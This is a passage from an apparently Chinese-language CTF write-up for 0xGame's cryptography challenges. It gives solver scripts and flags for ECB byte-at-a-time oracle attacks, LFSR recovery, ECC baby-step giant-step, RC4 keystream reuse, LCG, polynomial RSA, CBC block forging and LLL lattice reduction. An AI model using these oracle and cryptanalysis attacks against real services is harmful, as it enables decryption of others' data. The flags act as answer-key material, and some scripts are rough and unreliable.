{e}\")\n        return\n\n    known_flag = b'0xGame{'\n    print(f\"[*] Starting ECB byte-at-a-time attack with known prefix: {known_flag.decode()}\")\n    print(\"-\" * 50)\n\n    try:\n        while not known_flag.endswith(b'}'):\n            # 1. 对齐步骤 (Alignment)\n            # 构造填充物 (padding)，其长度能让下一个未知字节恰好落在16字节块的末尾\n            # 例如，当 known_flag 长度为7时, 我们需要 15-7=8 个 'A'\n            padding_len = (BLOCK_SIZE - 1) - (len(known_flag) % BLOCK_SIZE)\n            padding = b'A' * padding_len\n            \n            # 发送这个对齐用的 payload，获取目标密文\n            # 服务器会加密: pad(padding + flag, 16)\n            response_hex = get_encryption(s, padding.hex())\n            if not response_hex:\n                print(\"[-] Failed to get response from oracle during alignment.\")\n                break\n            \n            # 我们感兴趣的密文块，是包含第一个未知字节的那一块\n            # 它的索引可以通过 (padding长度 + 已知flag长度) / 16 来计算\n            target_block_index = (len(padding) + len(known_flag)) // BLOCK_SIZE\n            start_pos = target_block_index * BLOCK_SIZE * 2  # 1字节=2个hex字符\n            end_pos = start_pos + (BLOCK_SIZE * 2)\n            target_block = response_hex[start_pos:end_pos]\n\n            # 2. 爆破步骤 (Brute-force)\n            found_char = False\n            # 优先尝试常见的 flag 字符集\n            charset = (string.ascii_letters + string.digits + \"_-!{}?@#$\").encode('latin-1')\n\n            for char_code in charset:\n                guess_char = bytes([char_code])\n                \n                # 构造测试 payload: padding + known_flag + guess\n                # 服务器会加密: pad(padding + known_flag + guess + rest_of_flag, 16)\n                # 这个构造使得 (padding + known_flag + guess) 组成一个或多个完整的块\n                test_payload = padding + known_flag + guess_char\n                \n                test_response_hex = get_encryption(s, test_payload.hex())\n                if not test_response_hex:\n                    # 如果单次请求失败，跳过这个字符，避免程序崩溃\n                    continue\n\n                # 提取相同位置的密文块进行比较\n                test_block = test_response_hex[start_pos:end_pos]\n                \n                if test_block == target_block:\n                    known_flag += guess_char\n                    # 使用 'ignore' 以避免非UTF-8字符打印时出错\n                    print(f\"[+] Found: '{guess_char.decode('latin-1', 'ignore')}'  ->  Flag: {known_flag.decode('latin-1', 'ignore')}\")\n                    found_char = True\n                    break\n            \n            if not found_char:\n                print(\"\\n[-] Attack failed. Could not find the next character in the charset.\")\n                break\n    \n    finally:\n        print(\"-\" * 50)\n        if known_flag.endswith(b'}'):\n            print(f\"[!] Success! Full flag found: {known_flag.decode('latin-1', 'ignore')}\")\n        else:\n            print(f\"[*] Attack stopped. Partial flag: {known_flag.decode('latin-1', 'ignore')}\")\n        s.close()\n\nif __name__ == '__main__':\n    solve()\n```\n\n得到`0xGame{5679df1b-4bae-4715-8433-4d52ccb258ef}`\n\n## LFSR\n\n线性反馈移位寄存器。\n\n```python\nfrom Crypto.Cipher import AES\n\ndef int_to_bits(x, bit_length):\n    \"\"\"将整数转为比特列表，高位在前\"\"\"\n    return [(x >> i) & 1 for i in reversed(range(bit_length))]\n\ndef bits_to_int(bits):\n    \"\"\"将比特列表转为整数\"\"\"\n    return int(''.join(str(b) for b in bits), 2)\n\ndef lfsr_step(state, mask, length=128):\n    \"\"\"模拟LFSR的一步\"\"\"\n    output = 0\n    for i in range(length):\n        output ^= state[i] & mask[i]\n    new_state = state[1:] + [output]\n    return new_state, output\n\ndef recover_mask_from_keystream(keystream, n=128):\n    \"\"\"从密钥流恢复mask\"\"\"\n    # 构建线性方程组: 对于 i = n 到 2n-1\n    # keystream[i] = mask · [keystream[i-n], ..., keystream[i-1]]\n    A = []\n    b = []\n    \n    for i in range(n, 2*n):\n        # 状态向量是前n个输出比特\n        state_vector = keystream[i-n:i]\n        A.append(state_vector)\n        b.append(keystream[i])\n    \n    # GF(2)上的高斯消元\n    size = n\n    mat = [row + [b[i]] for i, row in enumerate(A)]\n    \n    # 前向消元\n    for col in range(size):\n        # 找到主元\n        pivot = -1\n        for row in range(col, size):\n            if mat[row][col] == 1:\n                pivot = row\n                break\n        if pivot == -1:\n            continue\n            \n        # 交换行\n        mat[col], mat[pivot] = mat[pivot], mat[col]\n        \n        # 消去其他行\n        for row in range(col + 1, size):\n            if mat[row][col] == 1:\n                for j in range(col, size + 1):\n                    mat[row][j] ^= mat[col][j]\n    \n    # 回代求解\n    mask = [0] * size\n    for i in reversed(range(size)):\n        if mat[i][i] == 0:\n            if mat[i][size] == 0:\n                # 自由变量，设为0\n                mask[i] = 0\n            else:\n                print(f\"矛盾方程 at row {i}\")\n                return None\n        else:\n            mask[i] = mat[i][size]\n            for j in range(i + 1, size):\n                mask[i] ^= mat[i][j] & mask[j]\n    \n    return mask\n\n# 已知数据\nrandom1 = 79262982171792651683253726993186021794\nrandom2 = 121389030069245976625592065270667430301\nciphertext = b'\\xb9WE<\\x8bC\\xab\\x92J7\\xa9\\xe6\\xe8\\xd8\\x93D\\xcc\\xac\\xfdvfZ}C\\xe6\\xd8;\\xf7\\x18\\xbauz`\\xb9\\xe0\\xe6\\xc6\\xae\\x00\\xfb\\x96%;k{Ph\\xfa'\n\nprint(\"分析LFSR...\")\n\n# 检查数值\nprint(f\"random1: {random1}\")\nprint(f\"random2: {random2}\")\nprint(f\"random1 比特长度: {random1.bit_length()}\")\nprint(f\"random2 比特长度: {random2.bit_length()}\")\n\n# 转为比特序列（确保128位）\nbits1 = int_to_bits(random1, 128)\nbits2 = int_to_bits(random2, 128)\nkeystream = bits1 + bits2\n\nprint(f\"密钥流长度: {len(keystream)} 比特\")\n\n# 方法1: 直接解线性方程组\nprint(\"\\n方法1: 解线性方程组...\")\nmask_bits = recover_mask_from_keystream(keystream)\nif mask_bits:\n    mask = bits_to_int(mask_bits)\n    print(f\"找到 mask: {hex(mask)}\")\n    \n    # 验证mask\n    test_state = bits1[:]  # 初始状态是random1的比特\n    test_mask = mask_bits\n    generated = []\n    for _ in range(256):\n        test_state, out = lfsr_step(test_state, test_mask)\n        generated.append(out)\n    \n    # 检查是否匹配\n    if generated[128:256] == bits2:\n        print(\"✓ Mask 验证成功!\")\n    else:\n        print(\"✗ Mask 验证失败\")\n    \n    # 解密\n    for order in ['big', 'little']:\n        key = mask.to_bytes(16, order)\n        cipher = AES.new(key, AES.MODE_ECB)\n        plaintext = cipher.decrypt(ciphertext)\n        print(f\"\\n{order} 顺序解密:\")\n        try:\n            decoded = plaintext.decode('utf-8', errors='ignore')\n            print(f\"解码: {decoded}\")\n            if '0xGame' in decoded or 'flag' in decoded or '{' in decoded:\n                print(\"*** 找到 flag! ***\")\n        except:\n            print(f\"原始字节: {plaintext}\")\nelse:\n    print(\"方法1失败\")\n\n# 方法2: 如果上面失败，尝试暴力搜索附近的mask值\nprint(\"\\n方法2: 尝试附近可能的mask值...\")\nif mask_bits:\n    base_mask = bits_to_int(mask_bits)\n    # 尝试一些变体\n    for shift in range(-10, 11):\n        test_mask = (base_mask + shift) & ((1 << 128) - 1)\n        for order in ['big', 'little']:\n            try:\n                key = test_mask.to_bytes(16, order)\n                cipher = AES.new(key, AES.MODE_ECB)\n                plaintext = cipher.decrypt(ciphertext)\n                if b'0xGame' in plaintext:\n                    print(f\"找到 flag! mask={hex(test_mask)}, order={order}\")\n                    print(f\"Flag: {plaintext}\")\n                    break\n            except:\n                pass\n```\n\n得到`0xGame{124ab3f1-4c3e-4d2a-8e6f-9b5e6c7d8f90}`\n\n## ECC\n\n大步小步法计算私钥s。\n\n```python\nfrom hashlib import sha256\nfrom Crypto.Cipher import AES\nimport math\n\n# ===============================================================\n# 第一部分：椭圆曲线和 Point 类的定义\n# ===============================================================\n\n# 椭圆曲线 secp256r1 (NIST P-256) 的参数\np = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff\na = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc\nb = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b\n\n# 辅助函数：计算模逆元\n# 使用扩展欧几里得算法\ndef inv(n, p):\n    return pow(n, p - 2, p)\n\nclass Point:\n    \"\"\"\n    一个表示 secp256r1 椭圆曲线上点的类\n    \"\"\"\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n        self.a = a\n        self.b = b\n        self.p = p\n\n    # 定义点加法\n    def __add__(self, other):\n        # 处理无穷远点 (用 None 表示)\n        if other is None:\n            return self\n\n        # 两个点相同，执行点倍增\n        if self == other:\n            # lam = (3 * x^2 + a) / (2 * y) mod p\n            lam = (3 * self.x * self.x + self.a) * inv(2 * self.y, self.p) % self.p\n        else: # 两个点不同\n            # lam = (y2 - y1) / (x2 - x1) mod p\n            lam = (other.y - self.y) * inv(other.x - self.x, self.p) % self.p\n        \n        # 计算新点的坐标\n        # x3 = lam^2 - x1 - x2 mod p\n        x3 = (lam * lam - self.x - other.x) % self.p\n        # y3 = lam * (x1 - x3) - y1 mod p\n        y3 = (lam * (self.x - x3) - self.y) % self.p\n        \n        return Point(x3, y3)\n\n    # 定义标量乘法 (s * P)\n    def __mul__(self, s):\n        current = self\n        res = None # 这是无穷远点\n        \n        # 使用快速幂的思想 (二进制展开法)\n        while s > 0:\n            if s & 1: # 如果当前位是 1\n                if res is None:\n                    res = current\n                else:\n                    res = res + current\n            current = current + current # 点倍增\n            s >>= 1 # 右移一位\n        return res\n\n    # 定义点的相等性\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.x == other.x and self.y == other.y\n\n    # 为了能将 Point 对象作为字典的键，需要定义 __hash__\n    def __hash__(self):\n        return hash((self.x, self.y))\n    \n    # 定义点的相反数\n    def __neg__(self):\n        return Point(self.x, -self.y % self.p)\n\n    # 方便打印\n    def __repr__(self):\n        return f\"({self.x}, {self.y})\"\n\n# ===============================================================\n# 第二部分：实现并运行大步小步法 (BSGS) 来找到 s\n# ===============================================================\n\ndef bsgs(base_point, target_point, search_limit):\n    \"\"\"\n    使用大步小步法求解椭圆曲线离散对数问题 (s * base_point = target_point)\n    :param base_point: 基点 P\n    :param target_point: 目标点 Q\n    :param search_limit: s 的最大搜索范围 (2^40)\n    :return: 整数 s\n    \"\"\"\n    m = int(math.sqrt(search_limit)) + 1\n    print(f\"步长 (m) 设置为: {m}\")\n\n    # 1. 计算小步 (Baby Steps) 并存入哈希表\n    baby_steps_table = {}\n    current_point = None # 0 * P\n    for j in range(m):\n        if current_point not in baby_steps_table:\n            baby_steps_table[current_point] = j\n        if current_point is None:\n            current_point = base_point\n        else:\n            current_point = current_point + base_point\n    print(\"小步表已生成完成。\")\n    \n    # 2. 计算大步的步进 (mP)\n    mP = base_point * m\n    mP_inv = -mP\n\n    # 3. 计算大步 (Giant Steps) 并查找匹配\n    giant_step_point = target_point\n    for i in range(m):\n        # 查找 Q - i*m*P 是否在小步表中\n        if giant_step_point in baby_steps_table:\n            j = baby_steps_table[giant_step_point]\n            s = i * m + j\n            # 由于0*P和负点的情况，可能需要微调\n            if base_point * s == target_point:\n                 return s\n        giant_step_point = giant_step_point + mP_inv\n    \n    return None # 没有找到解\n\n# ===============================================================\n# 第三部分：整合并执行解密\n# ===============================================================\n\nif __name__ == '__main__':\n    # 题目中给出的 P 和 Q 的坐标\n    P_coords = (96072097493962089165616681758527365503518618338657020069385515845050052711198, 106207812376588552122608666685749118279489006020794136421111385490430195590894)\n    Q_coords = (100307267283773399335731485631028019332040775774395440323669585624446229655081, 22957963484284064705317349990185223707693957911321089428005116099172185773154)\n\n    # 创建 Point 对象\n    P = Point(P_coords[0], P_coords[1])\n    Q = Point(Q_coords[0], Q_coords[1])\n    \n    # s 的最大值是 2^40\n    search_space = 2**40\n    \n    print(\"正在使用大步小步法计算私钥 s，这可能需要一分钟左右...\")\n    s = bsgs(P, Q, search_space)\n\n    if s is not None:\n        print(f\"成功找到私钥 s: {s}\\n\")\n        \n        # 使用找到的 s 进行解密\n        print(\"正在使用 s 生成密钥并解密...\")\n        key = sha256(str(s).encode()).digest()\n        \n        ciphertext = b':\\xe5^\\xd2s\\x92kX\\x96\\x12\\xb7dT\\x1am\\x94\\x86\\xcd.\\x84*-\\x93\\xb5\\x14\\x8d\\x99\\x94\\x92\\xfaCE\\xbd\\x01&?\\xe1\\x01f\\xef\\x8f\\xe3\\x13\\x13\\x96\\xa6\\x0f\\xc0'\n        \n        cipher = AES.new(key, AES.MODE_ECB)\n        \n        decrypted_padded = cipher.decrypt(ciphertext)\n        \n        # 去除 PKCS7 填充\n        padding_len = decrypted_padded[-1]\n        flag = decrypted_padded[:-padding_len]\n        \n        print(\"\\n\" + \"=\"*40)\n        try:\n            print(f\"解密成功！ Flag 是: {flag.decode()}\")\n        except UnicodeDecodeError:\n            print(f\"解密成功！ Flag (原始字节): {flag}\")\n        print(\"=\"*40)\n\n    else:\n        print(\"未能找到 s。\")\n```\n\n得到![image-20251009211926304](C:\\Users\\ASUS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20251009211926304.png)\n\nflag:`0xgame{ECC_1s_4w3s0m3_but_n0t_perf3ct}`\n\n## 流密码\n\n已知加密key的明文是key*5,加密flag是32字节，所以msg也是32字节。两个密文是同一个RC4密钥加密的，我们可以求出密钥流的前32字节:\n\n```python\nkeystream = ciphertext_key[:32] ⊕ P2[:32]\n```\n\n然后用该密钥就能求出msg：\n\n```python\nmsg = ciphertext_flag ⊕ keystream\n```\n\n完整解密脚本：\n\n```python\nciphertext_flag = b'n\\xab\\xa8\\xf6%\\xf5\\xbd\\xc5\\x97\\xe0\\xa0zCpV{\\x04&\\x8a\\xe5\\xe1TP\\xe0'\nciphertext_key = b'\\x83=x{\\xbcb\\r^3nl\\xbe\\xf4\\xdb\\xe5\\xc5\\x86\\x9e-Rt\\xf9\\x93\\t\\x883I\\xdd\\xcdx\\x01\"\\xb6d\\xd3A\\xa47|\\x8d\\xf8\\xe9\\xb1\\x04\\xfaz\\x83t\\xd5\\x85\\xd19\\xfd\\xbc\\x88\\xc8\\x05fJZ\\xae\\xba%\\x04B\\xd6a>\\xf7\\xc6B\\xc0`\\xc2\\xc4\\x10\\x83BbJ'\n\nkey_known = b\"This is keyyyyyy\" * 5\n\n# 取前 32 字节\nkey_part = key_known[:32]\ncipher_key_part = ciphertext_key[:32]\n\nkeystream = bytes(a ^ b for a, b in zip(cipher_key_part, key_part))\n\nmsg = bytes(a ^ b for a, b in zip(ciphertext_flag, keystream))\n\nprint(\"msg =\", msg)\nprint(msg.decode('gbk'))\n```\n\n后面发现这居然是GBK编码 ( ?   于是加了这一行`print(msg.decode('gbk'))`，得到flag：`0xGame{哈哈哈没想到我是中文的吧}`\n\n## LCG\n\nRNG=1，得到`Encrypted flag: [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]`所以flag是36字节。\n\n先找RNG状态序列：从 `seed=1` 开始迭代 RNG，直到状态重复，记录所有状态序列 `states`。\n\n枚举a和b：因为 `a` 和 `b` 是 `states[k1]` 和 `states[k2]`，其中 `k1, k2` 在 `[1, 1024]` 范围内（因为 `random.randint(1, 1024)`），所以取 `a = states[i]`, `b = states[j]`，其中 `i` 和 `j` 从 1 到 min(1024, len(states))\n\n完整exp:\n\n```python\nfrom Crypto.Util.number import inverse\n\nMOD = 2**32 + 1\n\ncoefficients = [77549, 468297, 447715, 99019, 1039399, 618114, 67952, 512021, 390981, 412152]\nenc_flag = [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]\n\nclass RNG():\n    def __init__(self, coefficients, seed, MOD=2**20):\n        self.coefficients = coefficients\n        self.state = seed\n        self.MOD = MOD\n        self.f = lambda x: sum(c * (x ** i) for i, c in enumerate(coefficients)) % MOD\n\n    def next(self):\n        self.state = self.f(self.state)\n        return self.state\n\n# 生成 RNG 状态序列（足够长，比如 5000 个状态，确保覆盖循环）\nseed = 1\nrng = RNG(coefficients, seed)\nstates = [seed]\nfor _ in range(5000):\n    nxt = rng.next()\n    if nxt == states[0]:\n        break\n    states.append(nxt)\n\nprint(f\"Generated {len(states)} unique RNG states\")\n\n# 枚举 a 和 b 的可能值（索引从 1 到 1024）\nfound = False\nfor i in range(1, min(1025, len(states))):\n    a = states[i]\n    if gcd(a, MOD) != 1:\n        continue\n    inv_a = inverse(a, MOD)\n    for j in range(1, min(1025, len(states))):\n        b = states[j]\n        plain = []\n        for c in enc_flag:\n            possible_byte = None\n            state_val = c\n            # 反向 1 到 1024 步\n            for step in range(1, 1025):\n                state_val = (state_val - b) * inv_a % MOD\n                if 0 <= state_val <= 255:\n                    if possible_byte is None:\n                        possible_byte = state_val\n                    else:\n                        # 如果多个步数都得到合法字节，需要选择，这里先取第一个\n                        # 实际上应该检查一致性，我们先简单处理\n                        pass\n            if possible_byte is None:\n                break\n            plain.append(possible_byte)\n        if len(plain) == len(enc_flag):\n            # 检查是否可打印 ASCII\n            try:\n                text = bytes(plain).decode('ascii')\n                if all(32 <= p < 127 for p in plain):\n                    print(f\"Found: a={a}, b={b}, plaintext = {text}\")\n                    found = True\n                    break\n            except:\n                pass\n    if found:\n        break\n\nif not found:\n    print(\"Not found with given constraints.\")\n```\n\n## PolyRSA\n\n```python\np = Integer(211381997162225534712606028333737323293)\nq = Integer(291844321073146066895055929747029949743)\nn = p * q\ne = 65537\n\n# 定义多项式环\nRp.<x> = PolynomialRing(GF(p))\nRq.<x> = PolynomialRing(GF(q))\nRn.<x> = PolynomialRing(Zmod(n))\n\n# 定义模 x^8 - 1\nSp = Rp.quotient(x^8 - 1, 'a')\nSq = Rq.quotient(x^8 - 1, 'b')\nSn = Rn.quotient(x^8 - 1, 'c')\n\n# 密文多项式系数\nc_coeffs = [40882135200347703593754473549436673146387957409540306808209934514868940052992,\n            13673861744940819052324430973254902841262867940443611208276249322420769352299,\n            14825937682750201471490037222143248112539971745568733623844924679519292569979,\n            38679688295547579683397975810830690182925250157203662993481664387755200460738,\n            48188456496545346035512990878010917911654453288374940837147218298761674630209,\n            573073037892837477865699910635548796182825197336726898256762153949994844160,\n            33191976337303879621137795936787377133622652419928253776624421127421475322069,\n            46680445255028101113817388282005859237776046219558912765486646689142241483104]\n\nc_poly = Sn(c_coeffs)\n\n# 计算单位群阶\norder_p = (p-1)^2 * (p^2 - 1) * (p^4 - 1)\norder_q = (q-1)^2 * (q^2 - 1) * (q^4 - 1)\norder = lcm(order_p, order_q)\nd = inverse_mod(e, order)\n\n# 解密\nm_poly = c_poly^d\n\n# 提取系数\nm_coeffs = [Integer(m_poly[i]) for i in range(8)]\n\nprint(\"解密后的系数:\", m_coeffs)\n\n# 检查系数是否在字节范围内\nfor i, coeff in enumerate(m_coeffs):\n    print(f\"系数 {i}: {coeff} (在 0-255 内: {0 <= coeff <= 255})\")\n\n# 如果在字节范围内，转为字符\nif all(0 <= coeff <= 255 for coeff in m_coeffs):\n    flag = ''.join(chr(b) for b in m_coeffs)\n    print(\"Flag:\", flag)\nelse:\n    print(\"解密失败：系数不在 ASCII 范围内\")\n    print(\"尝试用 long_to_bytes 方式:\")\n    try:\n        flag_bytes = b''\n        for coeff in m_coeffs:\n            # 将大整数转为字节\n            while coeff > 0:\n                flag_bytes = bytes([coeff % 256]) + flag_bytes\n                coeff //= 256\n        print(\"Flag bytes:\", flag_bytes)\n    except Exception as e:\n        print(\"错误:\", e)\n```\n\n得到`0xGame{D0_y0u_l1k3_RSA_w1th_p0lyn0m14l_r1ngs?}`\n\n## CCB\n\n```python\n#!/usr/bin/env python3\n\nfrom base64 import b64decode, b64encode\nimport os\n\n# Given IV\nIV = b64decode(\"Mkoz9OBLUA4EgWqbuheBcg==\")\nprint(f\"IV: {IV.hex()}\")\n\n# Step 1: Create C-B-C pattern\n# We need C1 = C3 != C2\n# \n# For CBC mode:\n# C1 = E(P1 ⊕ IV)\n# C2 = E(P2 ⊕ C1)\n# C3 = E(P3 ⊕ C2)\n#\n# Strategy: \n# 1. Choose P1 and P2 arbitrarily\n# 2. Encrypt to get C1, C2\n# 3. Set P3 = P1 ⊕ IV ⊕ C2 so that P3 ⊕ C2 = P1 ⊕ IV\n#    This makes C3 = E(P3 ⊕ C2) = E(P1 ⊕ IV) = C1\n\nprint(\"\\n=== Step 1: Creating C-B-C ciphertext ===\")\nprint(\"Strategy: Choose P1, P2, then set P3 = P1 ⊕ IV ⊕ C2\")\nprint(\"This will make C3 = C1\")\n\n# For the first encryption, we can choose any P1 and P2\n# But we need to know C1 and C2 to compute P3\n# So we'll need to do this interactively\n\nprint(\"\\nFirst, encrypt with P1=00...00 (16 zeros), P2=01...01, P3=00...00 (temporary)\")\nP1 = b'\\x00' * 16\nP2 = b'\\x01' * 16\nP3_temp = b'\\x00' * 16\nplaintext1_temp = P1 + P2 + P3_temp\nprint(f\"Temporary plaintext (base64): {b64encode(plaintext1_temp).decode()}\")\nprint(\"After getting C1 and C2 from server, calculate:\")\nprint(\"P3 = P1 ⊕ IV ⊕ C2\")\nprint(\"Then encrypt again with the corrected plaintext\")\n\nprint(\"\\n=== Step 2: Creating C-C-B ciphertext ===\")\nprint(\"After getting C and B from step 1:\")\nprint(\"We need C1 = C2 = C and C3 = B\")\nprint(\"\\nStrategy:\")\nprint(\"1. Set P1 such that E(P1 ⊕ IV) = C\")\nprint(\"   So P1 = D(C) ⊕ IV - but we can't decrypt without the key\")\nprint(\"\\nAlternative strategy:\")\nprint(\"Since C1 from step 1 satisfies C1 = E(P1 ⊕ IV),\")\nprint(\"We need to reuse that same P1\")\nprint(\"For C2 = C1, we need E(P2 ⊕ C1) = C1\")\nprint(\"So P2 ⊕ C1 = P1 ⊕ IV\")\nprint(\"Therefore P2 = P1 ⊕ IV ⊕ C1\")\nprint(\"\\nFor C3 = B (which is C2 from step 1):\")\nprint(\"We need E(P3 ⊕ C2) = B\")\nprint(\"Since C2 = C1 (both equal to C), P3 ⊕ C1 = P2_old ⊕ C1_old\")\nprint(\"From step 1, C2_old = E(P2_old ⊕ C1_old) = B\")\nprint(\"So we need P3 ⊕ C = P2_old ⊕ C (where C = C1_old)\")\nprint(\"Therefore P3 = P2_old\")\n\nprint(\"\\n=== Practical Solution ===\")\nprint(\"1. Get IV from server\")\nprint(\"2. Encrypt P1||P2||temp with P1=zeros, P2=ones to get C1||C2||C3_temp\")\nprint(\"3. Calculate P3 = P1 ⊕ IV ⊕ C2\")\nprint(\"4. Encrypt P1||P2||P3 to get C||B||C (C-B-C pattern)\")\nprint(\"5. Calculate P2' = P1 ⊕ IV ⊕ C\")\nprint(\"6. Encrypt P1||P2'||P2 to get C||C||B (C-C-B pattern)\")\nprint(\"7. Get flag!\")\n\n# Helper function to XOR bytes\ndef xor_bytes(a, b):\n    return bytes(x ^ y for x, y in zip(a, b))\n\nprint(\"\\n=== Interactive Solver ===\")\nprint(\"Step 1: Use option 1 to encrypt this plaintext:\")\nP1 = b'\\x00' * 16\nP2 = b'\\xff' * 16  # Changed to all 0xFF to ensure P2 != P1\nP3_temp = b'\\x00' * 16\nplaintext_temp = P1 + P2 + P3_temp\nprint(f\"{b64encode(plaintext_temp).decode()}\")\nprint(\"\\nAfter you get the ciphertext, paste it here (base64):\")\nprint(\"(Or type 'manual' to calculate manually)\")\n\ntry:\n    ct1 = input().strip()\n    if ct1.lower() != 'manual' and ct1:\n        ct1_bytes = b64decode(ct1)\n        C1 = ct1_bytes[:16]\n        C2 = ct1_bytes[16:32]\n        \n        print(f\"\\nC1: {C1.hex()}\")\n        print(f\"C2 (this is B): {C2.hex()}\")\n        \n        # Calculate correct P3 for C-B-C\n        P3 = xor_bytes(xor_bytes(P1, IV), C2)\n        plaintext_cbc = P1 + P2 + P3\n        print(f\"\\n=== C-B-C Plaintext (base64) ===\")\n        print(b64encode(plaintext_cbc).decode())\n        \n        # Calculate P2' for C-C-B\n        P2_prime = xor_bytes(xor_bytes(P1, IV), C1)\n        plaintext_ccb = P1 + P2_prime + P2\n        print(f\"\\n=== C-C-B Plaintext (base64) ===\")\n        print(b64encode(plaintext_ccb).decode())\n        \n        print(\"\\nUse these plaintexts in order when prompted for option 2!\")\n    else:\n        print(\"\\nManual calculation formulas:\")\n        print(\"Given C1||C2||C3 from temporary encryption:\")\n        print(\"P3_correct = P1 ⊕ IV ⊕ C2\")\n        print(\"P2' = P1 ⊕ IV ⊕ C1\")\n        print(\"\\nC-B-C plaintext: P1 || P2 || P3_correct\")\n        print(\"C-C-B plaintext: P1 || P2' || P2\")\nexcept:\n    print(\"\\nUse the formulas above to calculate manually\")\n```\n\n运行上述脚本，它会告诉你应该怎么做，首先选项1把`AAAAAAAAAAAAAAAAAAAAAP////////////////////8AAAAAAAAAAAAAAAAAAAAA==`这个粘进去，注意是base64编码的，所以记得结尾要有`==`,没有记得补上。然后服务器会返回给你加密的内容，粘进脚本里，`Ug7WsyG0J3FNWii4QRq2HQBI5mgU27sArYBi5lVTcR06+3+4x5Tdy5Ec9yMH2Xva`,然后它会给你解出cbc：`AAAAAAAAAAAAAAAAAAAAAP////////////////////8yAtWc9JDrDqkBCH3vRPBv`和ccb：`AAAAAAAAAAAAAAAAAAAAAGBE5UfB/3d/SdtCI/sNN2//////////////////////`,从而得到flag：` 0xGame{fdc902c6-873a-4d92-b366-b6e83bde39f7}`.\n\n## 格\n\n解格：\n\n```python\n# SageMath 代码 (最终版)\n\n# 1. 这是你从程序输出中提供的矩阵\nmatrix_data = [\n    [3284681750909390818306909313921642175535822995982583393933696966300433498618099, 7062920994008607414635543198964747262695143293079919687270285360471612225464116, 9826330432780730699882966183005563282601785988437488502794820428794464309726364, 10313939243981504072492843197821189873801981624046806578030558315476228320733359],\n    [14962120076283198553291772690327243603574931151327631953834236409697046371251172, 10914614871335511269514555072571377171094477247162595307427654861209446389077850, 13813513556033584840229315973248340868169094377335326963200609716900171410846991, 17767016205042422794681474520318417767408504251129953471000646286235093083687535],\n    [15880849953718488589631767682500857705255547835146769369286551172642086223544654, 23536981063518946472925309088916542857554725764823718161707669971432320275459487, 26927812823530065718296292087211430992875944789365872721297497760084580766210537, 22230074134750723773334677934743831896859185125095203873930495218095676602198247],\n    [14741023566046737527403024490343979553759831564949552088348125025359384680249250, 8837391869363988214859613817767621920507231139048698235441315423135328237787325, 9720795972355554118334542488724936259246227879278497862252939659284272861952841, 12075839868445672238363457714940958060191660916729079502656993881392627251511248]\n]\n\nM = matrix(ZZ, matrix_data)\n\n# 2. 应用 LLL 算法. 'B' 将是一个完整的 4x4 矩阵.\nB = M.LLL()\n\nprint(\"[+] LLL 规约后的基 (完整的 B 矩阵):\")\nprint(B)\n\nfound_secret = False\n\ndef recover_secret(vector, vector_name):\n    global found_secret\n    if found_secret: return\n\n    print(f\"\\n--- 正在检查向量: {vector_name} ---\")\n    for direction in [1, -1]:\n        v_cand = vector * direction\n        if v_cand.is_zero(): continue\n\n        first_nonzero_val = next((val for val in v_cand if val != 0), None)\n        for byte_val in range(1, 256):\n            if first_nonzero_val % byte_val == 0:\n                k = first_nonzero_val // byte_val\n                if k == 0: continue\n                s_cand = v_cand / k\n                if all(c.is_integer() and 0 <= c <= 255 for c in s_cand):\n                    secret_bytes = bytes([int(c) for c in s_cand])\n                    print(f\"[+] 成功! 在 '{vector_name}' 中找到可能的 secret\")\n                    print(f\"[-] secret: {secret_bytes.hex()}\")\n                    found_secret = True\n                    return\n\n# 3. 检查基向量及其简单组合\ncandidates = {\n    \"B[0]\": B[0], \"B[1]\": B[1],\n    \"B[0] + B[1]\": B[0] + B[1], \"B[0] - B[1]\": B[0] - B[1],\n    \"B[2]\": B[2], \"B[3]\": B[3]\n}\n\nfor name, vec in candidates.items():\n    if found_secret: break\n    recover_secret(vec, name)\n\nif not found_secret:\n    print(\"\\n[!] 未能恢复 secret. 问题可能比预想的更复杂.\")\n```\n\n\n\n解密flag：\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\n# 1. PEGA AQUÍ EL TEXTO CIFRADO COMPLETO DE 160 CARACTERES.\n#    El que proporcionaste tiene 156 caracteres (78 bytes), le faltan 4 caracteres (2 bytes) al final.\n#    Asegúrate de copiarlo entero.\nhex_ciphertext = \"83c9b4db1e036eada862d24928ae12641f7e56f713598661600da434cf3bc3e74429cbb807173626516dd030d964ad1f06ef2f9da03722943ba57653c4e0733b8474d57d450b01a331b1bd7ea36dcc4b\" # <--- ¡REEMPLAZA ESTO CON EL VALOR COMPLETO!\n\n# 2. La clave fija del programa.\nkey = b'0xGame2025awaQAQ'\nblock_size = AES.block_size  # 16 bytes\n\n# --- Script de Desencriptación Correcto ---\ntry:\n    full_ciphertext = bytes.fromhex(hex_ciphertext)\n    \n    # Comprobación de la longitud\n    if len(full_ciphertext) % block_size != 0:\n        print(f\"[!] ADVERTENCIA: La longitud del texto cifrado ({len(full_ciphertext)} bytes) no es un múltiplo de 16.\")\n        print(\"[!] Esto indica que el texto cifrado está incompleto. El resultado será incorrecto.\")\n\n    if len(full_ciphertext) < block_size:\n        raise ValueError(\"El texto cifrado es demasiado corto.\")\n\n    # El primer bloque del texto cifrado (C_1) actúa como el IV para descifrar el resto del mensaje.\n    iv_for_decryption = full_ciphertext[0:block_size]\n\n    # El texto cifrado que queremos descifrar es todo lo que sigue al primer bloque (C_2, C_3, ...).\n    ciphertext_to_decrypt = full_ciphertext[block_size:]\n    \n    # Crear un nuevo 